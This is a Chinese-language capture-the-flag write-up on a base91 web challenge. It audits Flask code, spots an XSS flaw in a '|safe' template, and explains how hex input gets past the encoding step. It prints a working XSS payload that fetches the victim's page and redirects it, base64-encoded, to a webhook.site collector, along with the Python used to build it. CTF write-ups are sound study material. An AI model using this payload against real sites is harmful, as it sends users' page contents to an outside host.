没有仔细做题直接看wp就会复现很慢（而且出很多问题、而且还是英文的wp（再一次感叹自己的英文水平弱小:sob:)）

先对网站大概扫一下发现是一个提供在线解base91的网站（只不过会有点小问题）

先代码审计一下（主要是扫一下代码）

```html
<h2 class="subtitle">{{encoding["text"]|safe}}</h2>
```

这里对text直接解码了就会有xss漏洞（下次遇见xss漏洞就不会那么措不及防了）

然后主要看create如何创建带有攻击性的字符

```python
def create():
    if not session:
        flash("Please log in")
        return redirect("/login")
    if request.method == "GET":
        return render_template("create.html", logged_out=False)
    elif request.method == "POST":
        if not request.form["text"]:
            return "Missing text"
        text = request.form["text"]
        if len(text) > 1000:
            flash("Too long!")
            return redirect("/create")
        encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
        encoding_id = create_encoding(session["username"], encoded)
        
        return redirect(f"/e/{encoding_id}")
```

关键句:

```python
 encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
```

这里如何判断text不是十六进制就直接encode,如果是十六进制就先用hex16进制解密一下

注意会在后面加一些东西防止xss注入

然后就开刷exp，这里学到一个网站webhook，相当于一键给自己搭了一个测试用的网站

```python
import based91
script='<script>fetch("/")["then"]((data)=>data["text"]())["then"]((html)=>location=atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvYjNhZThkNmEtMjkxMS00MGFkLWJmY2MtMDRhYmZmNTE2NmIxP2RhdGE9")+btoa(html))</script><p>sometag</pG'
result = based91.decode(script)
print(result.hex())

```

这里讲一下exp，

```javascript
fetch("/")
  ["then"]((data) => data["text"]())
  ["then"](
    (html) =>
      (location =
        atob("aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=") +
        btoa(html))
  );
```

这段代码的作用是从根路径获取数据，然后将获取到的文本内容经过 Base64 编码后与一个预定义的 URL 进行拼接，最终将浏览器重定向到拼接后的 URL。即可在测试的网站中获取网页内容。

```html
<p>sometag</pG
```

这种是为了防止网页过滤一点，成功起到xss攻击的效果

学到了挺多的（另外对于字符的仔细观察也必不可少（被坑了好多:sob:））
